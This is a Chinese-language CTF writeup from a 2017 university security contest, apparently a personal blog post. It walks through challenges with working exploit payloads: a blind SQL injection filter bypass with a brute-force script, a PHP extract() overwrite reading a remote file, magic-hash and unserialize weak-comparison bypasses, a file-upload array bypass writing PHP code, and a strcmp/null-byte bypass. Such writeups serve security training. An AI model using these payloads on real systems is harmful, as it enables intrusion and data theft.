---
layout: post
title: "2017高校网络信息安全管理 运维挑战赛部分writeup"
date: 2017-11-2
tags:
  php
  web
  CTF
categories:
  CTF
---
由于写writeup到一半时，主办方把题下线了，没法复现，所以部分题目没有很详细的截图，另外代码审计题的比重有点大
# 0x01 签到题
扫描二维码即可得到flag
# 0x02 隐藏在黑夜里的秘密
下载压缩包解压后有一张图片，使用stegsolve打开图片，进行偏移，至red plane 1(2,3)即可看见flag

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/stegsolve.png?raw=true)
# 0x03 login
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/login.png?raw=true)

这是一道盲注题，首先过滤了
> %0a %0c and like substr mid from select union * 空格 \| #

过滤的有点多，substr,mid,from被过滤就不能按照以往截取字符串的方式盲注了，这里可以使用regexp函数进行盲注，regexp类似于like，用于匹配符合条件的结果集，不同的是regexp是使用正则表达式进行匹配，regexp本地测试如下：
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/regexp.png?raw=true)

如图语句匹配以规定字符开头的密码所对应的结果集，可以达到逐字猜解的效果，查询密码长度：
```sql
uname=asd'or(length(pwd)>?)!='0&pwd=asd
```
密码长度为30，最终payload:
```sql
uname=asd'or(pwd)regexp'^?&pwd=asd
```
脚本如下：
```python
#!/usr/bin/env python
import requests
import re

url = "http://202.112.26.124:8080/fb69d7b4467e33c71b0153e62f7e2bf0/index.php"
str = "abcdefghijklmnopqrstuvwxyz"

def exp():
	password = ""
	payload = 'asd\'or(pwd)regexp\'^'
	for j in range(30):
		for i in str:
			data = {'uname':payload+i,'pwd':'asd'}
			res = requests.post(url,data=data)
			if re.search('password',res.content):
				password = password + i
				print password
				payload = payload + i

if __name__ == '__main__':
	exp()

```
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/blindsqli.png?raw=true)

登陆即可得到flag
# 0x04 快速计算
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/calc.png?raw=true)

访问页面随机生成数字，要求半秒内计算结果并提交，人类肯定办不到，所以还是得写脚本：
```python
#!/usr/bin/env python
import requests
import re

url = "http://202.120.7.220:2333/"
session = requests.Session()
res = session.get(url)
#print res.content
content = res.content
math = re.findall(r"\d+\*\d+\+\d+\*\(\d+\+\d+\)=",content)[0]
num = re.findall(r"\d+",math)
#print num
result = int(num[0])*int(num[1])+int(num[2])*(int(num[3])+int(num[4]))
#print result
data = {'v':result}
res1 = session.post(url,data=data)
print res1.content
```
# 0x05 php trick
右键查看源码，html注释中是index.php的源码
```php
<!--
    	index.php
    	<?php
		$flag='xxx';
		extract($_GET);
		if(isset($gift)){
		    $content=trim(file_get_contents($flag));
		    if($gift==$content){
		       echo'flag';     }
		     else{
		       echo'flag被加密了 再加密一次就得到flag了';}
		     }
		?>
		-->
```
extract()函数造成变量覆盖导致$gift,$flag可以通过get传入值覆盖，file_get_contents()函数支持http协议远程读取文件，所以在vps上构造1.txt内容123，最终payload：

> 202.120.7.221:2333/index.php?gift=123&flag=http://xxxxxx/1.txt (vps地址)

# 0x06 不是管理员也能login
说明与帮助中给出代码：
```php
$test=$_GET['userid']; $test=md5($test);
   if($test != '0'){
       $this->error('用户名有误,请阅读说明与帮助！');
    }
```
用户名Md5值要等于0,这道题考点是php弱类型比较，让用户名Md5值格式为0e?????即可，科学技术法0的无论多少次方还是为0,构造用户名为：**QNKCDZO**，md5值0e830400451993494058024219903391
右键源码：
```php
$pwd =$this->_post("password");
$data_u = unserialize($pwd);
if($data_u['name'] == 'XX' && $data_u['pwd']=='XX')
    {
      print_r($flag);
    }
```
将输入的密码反序列化，从条件看出，反序列化后需要是数组，键名name的键值要为一个未知的字符串，键名pwd的键值也要为未知的字符串，0和字符串双等弱比较会返回true还是考察弱比较，构造password：
```php
<?php
$a = array('name'=>0,'pwd'=>0);
echo serialize($a);
?>
```
> **a:2:{s:4:"name";i:0;s:3:"pwd";i:0;}**

登陆即可得到flag
# 0x07 文件上传
这道题有bug，填写文件后缀处居然存在xss，出题人太不小心了，一开始还以为是考xss，浪费了不少时间，上传文件内容处过滤了<，导致上传的php文件无法正常解析，这里post数组就可以绕过了检查了，payload：
```
ext=php&content[]=<?php phpinfo();?>
```
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/fileupload.png?raw=true)
# 0x08 php代码审计
get传入args，值必须为字母数字，然后传入eval的居然是个双$，直接传入GLOBALS，带入eval中的就变成了$GLOBALS，就可以将所有已定义的变量var_dump出来了，payload：
> index.php?args=GLOBALS

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/codeaudit.png?raw=true)
# 0x09 随机数
没有什么技巧，就是一把梭，直接爆破出来的：
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/forcebrute.png?raw=true)
# 0x10 php是最好的语言
bak泄漏，下载index.php.bak，源码如下：
```php
<?php
$v1=0;$v2=0;$v3=0;
$a=(array)unserialize(@$_GET['foo']);
print_r($a);
if(is_array($a)){
    is_numeric(@$a["param1"])?exit:NULL;
    if(@$a["param1"]){
        ($a["param1"]>2017)?$v1=1:NULL;
    }
    if(is_array(@$a["param2"])){
        if(count($a["param2"])!==5 OR !is_array($a["param2"][0])) exit;
        $pos = array_search("nudt", $a["param2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["param2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['egg'];
$d=@$_GET['fish'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("M|n|s",$d.$c[0])?err():NULL;
        strpos(($c[0].$d), "MyAns")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}

?>
```
先看最后，需要v1 v2 v3都为真才能echo出flag，需要传入一串序列化字串，反序列化后param1对应键值在is_numeric时如果传入的是字符串会先intval()，为数字就退出，不为数字即可，然后param1对应键值只要大于2017即可使v1=1，这里给param1赋值2018e即可
param2键值需要为数组，数组元素等于5，第一个数组首位元素也要为数组，然后是array_search()，在数组搜索字符串，并返回对应键名，这里又是考察弱比较，"nudt"在和整形变量比较时会先被intval()强制转换，也就是intval("nudt") == 0，所以通过与整形变量比较来绕过，即可使v2值为1
然后是strcmp，传入数组即可返回false，eregi函数用00截断绕过，最后可以即可使v3值为1,具体payload如下：
> index.php?foo=a:2:{s:6:"param1";s:5:"2018e";s:6:"param2";a:5:{i:0;a:1:{i:0;i:1;}i:1;i:0;i:2;i:2;i:3;i:3;i:4;i:4;}}&egg[1][]=1111&fish=1&egg[0]=%00MyAns

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/bypasspayload.png?raw=true)
